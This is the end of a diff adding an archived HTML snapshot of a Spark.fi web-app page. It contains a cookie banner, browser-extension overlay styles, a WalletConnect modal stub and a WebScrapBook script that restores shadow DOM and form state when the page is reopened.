+                                    <button data-testid="component-ConvertStablesButton" disabled="" class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 bg-neutral-950 text-primary-inverse active:bg-neutral-950 hover:bg-neutral-800 active:text-primary-inverse disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-8 p-2 gap-2" type="button">Convert</button>
+                                 </div>
+                              </div>
+                           </section>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="flex flex-col gap-4 rounded-sm border border-primary bg-primary p-4 shadow-2xl sm:max-w-[335px] fixed inset-x-2 bottom-2 z-[1000] sm:right-6 sm:bottom-6 sm:left-auto transform transition-all duration-500 ease-in-out translate-y-full opacity-0">
+                     <div class="grid grid-cols-[auto_1fr] gap-4">
+                        <div class="bg-gradient-spark-primary-1 bg-clip-text text-transparent">
+                           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-md">
+                              <path d="M8.5 8.5V8.51M16 15.5V15.51M12 12V12.01M11 17V17.01M7 14V14.01M12 2C10.0222 2 8.08879 2.58649 6.4443 3.6853C4.79981 4.78412 3.51809 6.3459 2.76121 8.17317C2.00433 10.0004 1.8063 12.0111 2.19215 13.9509C2.578 15.8907 3.53041 17.6725 4.92894 19.0711C6.32746 20.4696 8.10929 21.422 10.0491 21.8079C11.9889 22.1937 13.9996 21.9957 15.8268 21.2388C17.6541 20.4819 19.2159 19.2002 20.3147 17.5557C21.4135 15.9112 22 13.9778 22 12C21.305 12.214 20.5648 12.2345 19.8591 12.0593C19.1533 11.8841 18.5087 11.5198 17.9945 11.0056C17.4803 10.4913 17.116 9.8467 16.9407 9.14094C16.7655 8.43517 16.786 7.69499 17 7C16.305 7.214 15.5648 7.23449 14.8591 7.05927C14.1533 6.88405 13.5087 6.51975 12.9945 6.00555C12.4803 5.49135 12.116 4.8467 11.9407 4.14094C11.7655 3.43517 11.786 2.69499 12 2Z" stroke="url(#paint0_linear_1812_44977)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                              <defs>
+                                 <linearGradient id="paint0_linear_1812_44977" x1="-2.13793" y1="-3.27778" x2="23.7291" y2="3.64808" gradientUnits="userSpaceOnUse">
+                                    <stop stop-color="#FFC555"></stop>
+                                    <stop offset="1" stop-color="#FB4AB9"></stop>
+                                 </linearGradient>
+                              </defs>
+                           </svg>
+                        </div>
+                        <div class="flex flex-col gap-1">
+                           <div class="typography-label-3 text-primary">Cookies Policy</div>
+                           <div class="typography-label-4 text-secondary">We use cookies to ensure that we give you the best experience on our app. To learn more, visit our <a rel="noopener noreferrer" class="bg-gradient-spark-secondary bg-clip-text text-transparent hover:brightness-[90%] active:brightness-[80%] cursor-pointer rounded-[1px] focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0" href="https://spark.fi/privacy-policy" target="_blank">Privacy Policy</a>.</div>
+                        </div>
+                     </div>
+                     <div class="grid grid-cols-2 gap-3"><button class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 before:-z-10 bg-gradient-spark-primary-1 text-primary-inverse before:absolute focus-visible:before:bg-primary active:before:bg-neutral-800 before:inset-0 before:transition-colors hover:before:bg-neutral-950 active:text-primary-inverse disabled:cursor-not-allowed disabled:text-neutral-500 disabled:before:bg-neutral-50 disabled:bg-gradient-to-r disabled:from-neutral-50 disabled:to-neutral-50 typography-button-2 h-8 p-2 gap-2" type="button">Accept</button><button class="relative isolate inline-flex select-none items-center justify-center overflow-hidden whitespace-nowrap rounded-sm transition-colors focus-visible:bg-primary focus-visible:text-neutral-950 focus-visible:outline-none focus-visible:ring focus-visible:ring-primary-200 focus-visible:ring-offset-0 bg-neutral-950 text-primary-inverse active:bg-neutral-950 hover:bg-neutral-800 active:text-primary-inverse disabled:cursor-not-allowed disabled:border-none disabled:bg-neutral-50 disabled:text-neutral-500 typography-button-2 h-8 p-2 gap-2" type="button">Decline</button></div>
+                  </div>
+               </main>
+            </div>
+         </div>
+      </div>
+      <veepn-guard-alert data-scrapbook-shadowdom="<style>html{box-sizing:border-box;text-size-adjust:100%;word-break:normal;-moz-tab-size:4;tab-size:4}*,:before,:after{background-repeat:no-repeat;box-sizing:border-box}:before,:after{text-decoration:inherit;vertical-align:inherit}*{padding:0;margin:0}hr{overflow:visible;height:0;color:inherit;border:0;border-top:1px solid}details,main{display:block}summary{display:list-item}small{font-size:80%}[hidden]{display:none}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}a{background-color:transparent}a:active,a:hover{outline-width:0}code,kbd,pre,samp{font-family:monospace}pre{font-size:1em}b,strong{font-weight:bolder}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{border-color:inherit;text-indent:0}iframe{border-style:none}input{border-radius:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none;-moz-appearance:none;appearance:none}textarea{overflow:auto;resize:vertical}button,input,optgroup,select,textarea{font:inherit;color:inherit}optgroup{font-weight:700}button{overflow:visible}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit],[role=button]{cursor:pointer}button::-moz-focus-inner,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{border-style:none;padding:0}button,html [type=button],[type=reset],[type=submit]{-webkit-appearance:button;-moz-appearance:button;appearance:button}button,input,select,textarea{background-color:transparent;border-style:none}button:-moz-focusring,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{outline:1px dotted ButtonText}select{-webkit-appearance:none;-moz-appearance:none;appearance:none}a:focus,button:focus,input:focus,select:focus,textarea:focus{outline-width:0}select::-ms-expand{display:none}select::-ms-value{color:currentcolor}legend{border:0;color:inherit;display:table;white-space:normal;max-width:100%}::-webkit-file-upload-button{-webkit-appearance:button;-moz-appearance:button;appearance:button;color:inherit;font:inherit}[disabled]{cursor:default}img{border-style:none}progress{vertical-align:baseline}[aria-busy=true]{cursor:progress}[aria-controls]{cursor:pointer}[aria-disabled=true]{cursor:default}ul,ol{list-style-type:none}figure{margin:0}.guard-popup{font-family:FigtreeVF,sans-serif;position:fixed;z-index:2147483638;top:8px;left:24px;overflow:visible;color:#222e3a;background-color:#fff;max-width:416px;width:calc(100% - 48px);border-radius:16px;box-shadow:0 4px 20px #00000040;padding:24px}.guard-popup__header{display:flex;justify-content:space-between;align-items:center;column-gap:16px;margin-bottom:24px}.guard-popup__close{display:flex;align-items:center;justify-content:center;width:24px;height:24px;opacity:.7}.guard-popup__img{line-height:0;margin-bottom:24px}.guard-popup__img img{width:100%;aspect-ratio:368/142;object-fit:cover;border-radius:12px;overflow:hidden}.guard-popup__title{font-size:24px;line-height:32px;margin-bottom:8px}.guard-popup__description{font-size:20px;line-height:28px;font-weight:500;color:#4a5764;margin-bottom:28px}.guard-popup__actions{display:flex;justify-content:flex-end;column-gap:16px}.guard-popup__btn{display:flex;align-items:center;justify-content:center;padding:8px 16px;border-radius:5px;font-size:16px;line-height:24px;font-weight:700;cursor:pointer;color:#fff;background:linear-gradient(180deg,#5695fd,#1554ff)}</style>">
+         <style>@font-face{font-family:FigtreeVF;src:url("") format("woff2 supports variations"),url("") format("woff2-variations");font-weight:100 1000;font-display:swap}</style>
+      </veepn-guard-alert>
+      <veepn-lock-screen data-scrapbook-shadowdom="<style>html{box-sizing:border-box;text-size-adjust:100%;word-break:normal;-moz-tab-size:4;tab-size:4}*,:before,:after{background-repeat:no-repeat;box-sizing:border-box}:before,:after{text-decoration:inherit;vertical-align:inherit}*{padding:0;margin:0}hr{overflow:visible;height:0;color:inherit;border:0;border-top:1px solid}details,main{display:block}summary{display:list-item}small{font-size:80%}[hidden]{display:none!important}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}a{background-color:transparent}a:active,a:hover{outline-width:0}code,kbd,pre,samp{font-family:monospace}pre{font-size:1em}b,strong{font-weight:bolder}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{border-color:inherit;text-indent:0}iframe{border-style:none}input{border-radius:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none;-moz-appearance:none;appearance:none}textarea{overflow:auto;resize:vertical}button,input,optgroup,select,textarea{font:inherit;color:inherit}optgroup{font-weight:700}button{overflow:visible}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit],[role=button]{cursor:pointer}button::-moz-focus-inner,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{border-style:none;padding:0}button,html [type=button],[type=reset],[type=submit]{-webkit-appearance:button;-moz-appearance:button;appearance:button}button,input,select,textarea{background-color:transparent;border-style:none}button:-moz-focusring,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{outline:1px dotted ButtonText}select{-webkit-appearance:none;-moz-appearance:none;appearance:none}a:focus,button:focus,input:focus,select:focus,textarea:focus{outline-width:0}select::-ms-expand{display:none}select::-ms-value{color:currentcolor}legend{border:0;color:inherit;display:table;white-space:normal;max-width:100%}::-webkit-file-upload-button{-webkit-appearance:button;-moz-appearance:button;appearance:button;color:inherit;font:inherit}[disabled]{cursor:default}img{border-style:none}progress{vertical-align:baseline}[aria-busy=true]{cursor:progress}[aria-controls]{cursor:pointer}[aria-disabled=true]{cursor:default}ul,ol{list-style-type:none}figure{margin:0}.lock-screen{font-family:FigtreeVF,sans-serif;letter-spacing:normal;position:fixed;z-index:2147483638;top:0;right:0;bottom:0;left:0;padding:32px 40px;color:#222e3a;background-color:#fdfdfd;display:flex;flex-direction:column;row-gap:12px;overflow:auto;background-image:radial-gradient(circle at 0% 0%,#e6fffdcc,#e6fffd00 50%),radial-gradient(circle at 100% 0%,#ebfffecc,#ebfffe00 50%),radial-gradient(circle at 100% 100%,#f0f5ffcc,#f0f5ff00 50%),radial-gradient(circle at 0% 100%,#f2f2ffcc,#f2f2ff00 50%),radial-gradient(circle at 50% 50%,#fff,#fffc,#f5f5ff66,#f0f0ff33,#f0f0ff00),linear-gradient(to bottom right,#e6fffd,#f2f2ff);background-size:100% 100%;background-repeat:no-repeat}.lock-screen__header{display:flex;align-items:center;justify-content:space-between}.lock-screen__logo{display:inline-flex;align-items:center;column-gap:12px;font-size:18px;font-weight:600}.lock-screen__close{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:50%;background-color:#222e3a1a}.lock-screen__main{flex-grow:1;align-content:center}.lock-screen__container{max-width:1120px;margin-inline:auto;display:flex;align-items:center;gap:24px}@media (width < 972px){.lock-screen__container{flex-direction:column}}.lock-screen__timer{display:flex;align-items:center;justify-content:center;width:100%}.lock-screen__content{width:100%}.lock-screen__title{font-size:48px;font-weight:700;line-height:56px;margin-bottom:16px}.lock-screen__description{font-size:18px;line-height:32px;margin-bottom:24px}.lock-screen__actions{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}.lock-screen__action{height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;text-align:center;padding:8px 24px}.upgrade-btn{color:#fff;background:linear-gradient(180deg,#20df9e,#13cf8f)}.skip-btn{color:#3066ff;border-width:1px;border-style:solid;border-color:#3066ff;position:relative}.skip-btn__tooltip{font-size:14px;line-height:24px;font-weight:400;position:absolute;z-index:1;left:50%;top:calc(100% + 18px);padding:8px 12px;color:#fff;border:1px solid #4a5764;background-color:#222e3a;border-radius:8px;width:max-content;pointer-events:none;animation:slide-in .6s ease-in-out forwards}@keyframes slide-in{0%{opacity:0;transform:translate(-50%,-100%)}to{opacity:1;transform:translate(-50%)}}.skip-btn__tooltip:after{content:&quot;&quot;;display:block;position:absolute;z-index:1;top:-8px;left:50%;width:0;height:0;border-style:solid;border-width:0 8px 8px;border-color:transparent transparent #222e3a;transform:translate(-6px)}.skip-btn__icon{display:none}.skip-btn:disabled{cursor:not-allowed}.skip-btn:disabled .skip-btn__tooltip,.skip-btn:disabled .skip-btn__text{display:none}.skip-btn:disabled .skip-btn__icon{display:initial;animation:tick-tock .8s steps(8,end) infinite}@keyframes tick-tock{to{transform:rotate(360deg)}}.timer{position:relative;max-width:422px;width:100%;aspect-ratio:1/1;border-radius:50%;background-color:#fff;box-shadow:0 0 40px #2b374114;display:flex;align-items:center;justify-content:center;pointer-events:none;-webkit-user-select:none;user-select:none}.timer__circle-backward{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:0;max-width:100%;height:auto;opacity:.4}.timer__circle-forward{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(45deg);z-index:1;max-width:100%;height:auto;animation:sector 5s linear forwards}.timer__fire-icon{position:absolute;top:22%;left:50%;transform:translate(-50%);z-index:2}.timer__text{font-size:clamp(18px,10vw,88px);letter-spacing:-1px;text-align:center;font-variant-numeric:tabular-nums;position:relative;z-index:3}.timer--finished .timer__text{color:#98a0a9}.timer--finished .timer__circle-forward{display:none}@keyframes sector{0%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,0% 100%,0% 2%)}25%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,0% 100%,0% 100%)}25.000001%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,0% 100%)}50%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%,100% 100%)}50.000001%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 100%)}75%{clip-path:polygon(50% 50%,0% 2%,100% 0%,100% 0%)}75.000001%{clip-path:polygon(50% 50%,0% 2%,100% 0%)}to{clip-path:polygon(50% 50%,0% 2%,0% 0%)}}@media (prefers-color-scheme: dark){.lock-screen{color:#fff;background-image:radial-gradient(circle at 0% 0%,#2f4f4fcc,#2f4f4f00 50%),radial-gradient(circle at 100% 0%,#193042cc,#19304200 50%),radial-gradient(circle at 100% 100%,#1c3041cc,#1c304100 50%),radial-gradient(circle at 0% 100%,#1b263bcc,#1b263b00 50%),radial-gradient(circle at 50% 50%,#141e28,#141e28cc,#1b263b66,#1c304133,#1c304100),linear-gradient(to bottom right,#2f4f4f,#1b263b)}.lock-screen__close{background-color:#ffffff1a}.skip-btn{color:#fff;border-color:#fff}.skip-btn__tooltip{color:#222e3a;border:1px solid #f5f6f7;background-color:#fff}.skip-btn__tooltip:after{border-color:transparent transparent #fff}.timer{background-color:#191b25}.timer__circle-backward{opacity:1}.timer--finished .timer__text{color:#5c6977}}</style>">
+         <style>@font-face{font-family:FigtreeVF;src:url("") format("woff2 supports variations"),url("") format("woff2-variations");font-weight:100 1000;font-display:swap}</style>
+      </veepn-lock-screen>
+      <wcm-modal data-scrapbook-adoptedstylesheets="0,1" data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$993020745$--></div></div>"></wcm-modal>
+      <svg aria-hidden="true" style="width: 0px; height: 0px; position: absolute; top: -100%; left: -100%;">
+         <text id="__react_svg_text_measurement_id">8%</text>
+      </svg>
+      <script data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets", k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode", k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus", k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment", k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/, k18 = '/scrapbook-slot-index', d = document, r = d.documentElement, $s = !!r.attachShadow, $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [], sls = [], slt = function (r) { if ($sa) { var E = r.childNodes, i, e, s, m; for (i = 0; i < E.length; i++) { e = E[i]; if (e.nodeType === 8) { s = e.nodeValue; if (m = s.match(k17)) { s = e.nextSibling; if (s.nodeType === 3) { sls[m[1]] = s; } r.removeChild(e); i--; } else if (s === k18) { r.removeChild(e); i--; } } } } }, sl = function () { var i = sle.length, j, d, e; while (i--) { d = sle[i]; e = d.elem; d = d.value.split(','); j = d.length; while (j--) { d[j] = sls[parseInt(d[j], 10)]; } try { e.assign.apply(e, d); } catch (ex) { console.error(ex); } } }, asl = (function (r) { var l = [], E, i, e, m, c, j; if ($as) { E = r.attributes; i = E.length; while (i--) { e = E[i]; if (!(m = e.nodeName.match(k9))) { continue; } c = l[m[1]] = new CSSStyleSheet(); r.removeAttribute(m[0]); m = e.nodeValue.split('\n\n'); j = m.length; while (j--) { try { m[j] && c.insertRule(m[j]); } catch (ex) { console.error(ex); } } } } return l; })(r), as = function (d, e) { var l, i, I; if ($as && (l = e.getAttribute(k8)) !== null) { l = l.split(','); for (i = 0, I = l.length; i < I; i++) { d.adoptedStyleSheets.push(asl[l[i]]); } e.removeAttribute(k8); } }, fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m; while (i--) { e = E[i]; s = e.shadowRoot; if ($s && (d = e.getAttribute(k1))) { if (!s) { try { s = e.attachShadow({ mode: (m = e.getAttribute(k10)) !== null ? m : 'open', clonable: e.hasAttribute(k11), delegatesFocus: e.hasAttribute(k12), serializable: e.hasAttribute(k13), slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void 0, }); s.innerHTML = d; } catch (ex) { console.error(ex); } } e.removeAttribute(k1); e.removeAttribute(k10); e.removeAttribute(k11); e.removeAttribute(k12); e.removeAttribute(k13); e.removeAttribute(k14); } if ($c && (d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if ($sa && (d = e.getAttribute(k15)) !== null) { sle.push({elem: e, value: d}); e.removeAttribute(k15); } if ($sa && (d = e.getAttribute(k16)) !== null) { sls[d] = e; e.removeAttribute(k16); } if (s) { slt(e); as(s, e); fn(s); } } }; as(d, r); fn(d); sl(); })()</script>
+   </body>
+</html>
